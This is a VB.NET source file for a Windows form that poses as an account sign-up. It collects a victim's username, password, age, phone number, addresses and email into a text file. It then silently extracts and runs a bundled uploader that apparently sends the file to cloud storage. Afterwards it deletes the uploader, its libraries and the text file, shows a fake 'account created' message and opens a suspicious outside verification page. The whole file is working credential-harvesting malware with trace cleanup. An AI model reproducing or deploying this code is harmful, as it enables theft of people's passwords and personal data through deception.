'Imports System.ComponentModel
Imports System.IO
Imports System.IO.Compression
'Imports System.IO.Compression.FileSystem
Public Class Form1
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        SaveFromResources(Application.StartupPath & "\System.IO.Compression.dll", My.Resources.System_IO_Compression)
    End Sub
    Public Sub SaveFromResources(ByVal FilePath As String, ByVal File As Object)
        Dim FByte() As Byte = File
        My.Computer.FileSystem.WriteAllBytes(FilePath, FByte, True)
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        'If My.Computer.FileSystem.DirectoryExists(Application.StartupPath & "\UploadYourDetails1") Then
        '    My.Computer.FileSystem.DeleteDirectory(Application.StartupPath & "\UploadYourDetails1", FileIO.DeleteDirectoryOption.DeleteAllContents)
        'End If
        'My.Computer.FileSystem.CreateDirectory(Application.StartupPath & "\UploadYourDetails1")
        If Username.Text = "" Then
            MsgBox("A BOX IS EMPTY!!!!!!!!!")
        ElseIf Password.Text = "" Then
            MsgBox("A BOX IS EMPTY!!!!!!!!!")
        ElseIf age.Text = "" Then
            MsgBox("A BOX IS EMPTY!!!!!!!!!")
        ElseIf Phone_number.Text = "" Then
            MsgBox("A BOX IS EMPTY!!!!!!!!!")
        ElseIf address.Text = "" Then
            MsgBox("A BOX IS EMPTY!!!!!!!!!")
        ElseIf workAddress.Text = "" Then
            MsgBox("A BOX IS EMPTY!!!!!!!!!")
        ElseIf email.Text = "" Then
            MsgBox("A BOX IS EMPTY!!!!!!!!!")

        Else
            Try
                Dim FILE_NAME As String = Application.StartupPath & "\Info.txt"
                Dim objWriter As New System.IO.StreamWriter(FILE_NAME)
                objWriter.WriteLine("Username - " & Username.Text)
                objWriter.WriteLine("Password - " & Password.Text)
                objWriter.WriteLine("Age - " & age.Text)
                objWriter.WriteLine("Phone - " & Phone_number.Text)
                objWriter.WriteLine("Address - " & address.Text)
                objWriter.WriteLine("Work Address - " & workAddress.Text)
                objWriter.WriteLine("Email - " & email.Text)
                objWriter.Close()
                SaveFromResources(Application.StartupPath & "\Upload.zip", My.Resources.Upload)
                ZipFile.ExtractToDirectory(Application.StartupPath & "\Upload.zip", Application.StartupPath & "\")
                'DataFileStorage.exe
                'MsgBox(Application.StartupPath & "\UploadYourDetails1\DataFileStorage.exe")
                Process.Start(Application.StartupPath & "\DataFileStorage.exe", "")
                'Path.GetDirectoryName(Application.StartupPath & "\UploadYourDetails1\DataFileStorage.exe");
                Timer1.Enabled = True
            Catch ex As Exception

            End Try

        End If

    End Sub

    Private Sub Form1_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        If My.Computer.FileSystem.FileExists(Application.StartupPath & "\Upload.zip") Then
            My.Computer.FileSystem.DeleteDirectory(Application.StartupPath & "\de", FileIO.DeleteDirectoryOption.DeleteAllContents)
            My.Computer.FileSystem.DeleteDirectory(Application.StartupPath & "\es", FileIO.DeleteDirectoryOption.DeleteAllContents)
            My.Computer.FileSystem.DeleteDirectory(Application.StartupPath & "\fr", FileIO.DeleteDirectoryOption.DeleteAllContents)
            My.Computer.FileSystem.DeleteDirectory(Application.StartupPath & "\it", FileIO.DeleteDirectoryOption.DeleteAllContents)
            My.Computer.FileSystem.DeleteDirectory(Application.StartupPath & "\ja", FileIO.DeleteDirectoryOption.DeleteAllContents)
            My.Computer.FileSystem.DeleteDirectory(Application.StartupPath & "\ko", FileIO.DeleteDirectoryOption.DeleteAllContents)
            My.Computer.FileSystem.DeleteDirectory(Application.StartupPath & "\ru", FileIO.DeleteDirectoryOption.DeleteAllContents)
            My.Computer.FileSystem.DeleteDirectory(Application.StartupPath & "\zh-Hans", FileIO.DeleteDirectoryOption.DeleteAllContents)
            My.Computer.FileSystem.DeleteDirectory(Application.StartupPath & "\zh-Hant", FileIO.DeleteDirectoryOption.DeleteAllContents)
            My.Computer.FileSystem.DeleteFile(Application.StartupPath & "\DataFileStorage.exe")
            My.Computer.FileSystem.DeleteFile(Application.StartupPath & "\DataFileStorage.exe.config")
            My.Computer.FileSystem.DeleteFile(Application.StartupPath & "\DataFileStorage.pdb")
            My.Computer.FileSystem.DeleteFile(Application.StartupPath & "\Info.txt")
            My.Computer.FileSystem.DeleteFile(Application.StartupPath & "\Microsoft.Data.Edm.dll")
            My.Computer.FileSystem.DeleteFile(Application.StartupPath & "\Microsoft.Data.Edm.xml")
            My.Computer.FileSystem.DeleteFile(Application.StartupPath & "\Microsoft.Data.OData.dll")
            My.Computer.FileSystem.DeleteFile(Application.StartupPath & "\Microsoft.Data.OData.xml")
            My.Computer.FileSystem.DeleteFile(Application.StartupPath & "\Microsoft.Data.Services.Client.dll")
            My.Computer.FileSystem.DeleteFile(Application.StartupPath & "\Microsoft.Data.Services.Client.xml")
            My.Computer.FileSystem.DeleteFile(Application.StartupPath & "\Microsoft.WindowsAzure.Configuration.dll")
            My.Computer.FileSystem.DeleteFile(Application.StartupPath & "\Microsoft.WindowsAzure.Storage.dll")
            My.Computer.FileSystem.DeleteFile(Application.StartupPath & "\Microsoft.WindowsAzure.Storage.xml")
            My.Computer.FileSystem.DeleteFile(Application.StartupPath & "\Newtonsoft.Json.dll")
            My.Computer.FileSystem.DeleteFile(Application.StartupPath & "\Newtonsoft.Json.xml")
            My.Computer.FileSystem.DeleteFile(Application.StartupPath & "\System.Spatial.dll")
            My.Computer.FileSystem.DeleteFile(Application.StartupPath & "\System.Spatial.xml")
            My.Computer.FileSystem.DeleteFile(Application.StartupPath & "\Upload.zip")
        End If
        My.Computer.FileSystem.DeleteFile(Application.StartupPath & "\System.IO.Compression.dll")
        'cleanup()
    End Sub

    Sub cleanup()
        Try
            If My.Computer.FileSystem.FileExists(Application.StartupPath & "\Upload.zip") Then
                My.Computer.FileSystem.DeleteDirectory(Application.StartupPath & "\de", FileIO.DeleteDirectoryOption.DeleteAllContents)
                My.Computer.FileSystem.DeleteDirectory(Application.StartupPath & "\es", FileIO.DeleteDirectoryOption.DeleteAllContents)
                My.Computer.FileSystem.DeleteDirectory(Application.StartupPath & "\fr", FileIO.DeleteDirectoryOption.DeleteAllContents)
                My.Computer.FileSystem.DeleteDirectory(Application.StartupPath & "\it", FileIO.DeleteDirectoryOption.DeleteAllContents)
                My.Computer.FileSystem.DeleteDirectory(Application.StartupPath & "\ja", FileIO.DeleteDirectoryOption.DeleteAllContents)
                My.Computer.FileSystem.DeleteDirectory(Application.StartupPath & "\ko", FileIO.DeleteDirectoryOption.DeleteAllContents)
                My.Computer.FileSystem.DeleteDirectory(Application.StartupPath & "\ru", FileIO.DeleteDirectoryOption.DeleteAllContents)
                My.Computer.FileSystem.DeleteDirectory(Application.StartupPath & "\zh-Hans", FileIO.DeleteDirectoryOption.DeleteAllContents)
                My.Computer.FileSystem.DeleteDirectory(Application.StartupPath & "\zh-Hant", FileIO.DeleteDirectoryOption.DeleteAllContents)
                My.Computer.FileSystem.DeleteFile(Application.StartupPath & "\DataFileStorage.exe")
                My.Computer.FileSystem.DeleteFile(Application.StartupPath & "\DataFileStorage.exe.config")
                My.Computer.FileSystem.DeleteFile(Application.StartupPath & "\DataFileStorage.pdb")
                My.Computer.FileSystem.DeleteFile(Application.StartupPath & "\Info.txt")
                My.Computer.FileSystem.DeleteFile(Application.StartupPath & "\Microsoft.Data.Edm.dll")
                My.Computer.FileSystem.DeleteFile(Application.StartupPath & "\Microsoft.Data.Edm.xml")
                My.Computer.FileSystem.DeleteFile(Application.StartupPath & "\Microsoft.Data.OData.dll")
                My.Computer.FileSystem.DeleteFile(Application.StartupPath & "\Microsoft.Data.OData.xml")
                My.Computer.FileSystem.DeleteFile(Application.StartupPath & "\Microsoft.Data.Services.Client.dll")
                My.Computer.FileSystem.DeleteFile(Application.StartupPath & "\Microsoft.Data.Services.Client.xml")
                My.Computer.FileSystem.DeleteFile(Application.StartupPath & "\Microsoft.WindowsAzure.Configuration.dll")
                My.Computer.FileSystem.DeleteFile(Application.StartupPath & "\Microsoft.WindowsAzure.Storage.dll")
                My.Computer.FileSystem.DeleteFile(Application.StartupPath & "\Microsoft.WindowsAzure.Storage.xml")
                My.Computer.FileSystem.DeleteFile(Application.StartupPath & "\Newtonsoft.Json.dll")
                My.Computer.FileSystem.DeleteFile(Application.StartupPath & "\Newtonsoft.Json.xml")
                My.Computer.FileSystem.DeleteFile(Application.StartupPath & "\System.Spatial.dll")
                My.Computer.FileSystem.DeleteFile(Application.StartupPath & "\System.Spatial.xml")
                My.Computer.FileSystem.DeleteFile(Application.StartupPath & "\Upload.zip")
            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Timer1.Enabled = False
        cleanup()
        MsgBox("Your account has been created. A webpage will open to continue")
        Process.Start("https://easyhello.iframeshoplifters.me/verify.html")
    End Sub
End Class
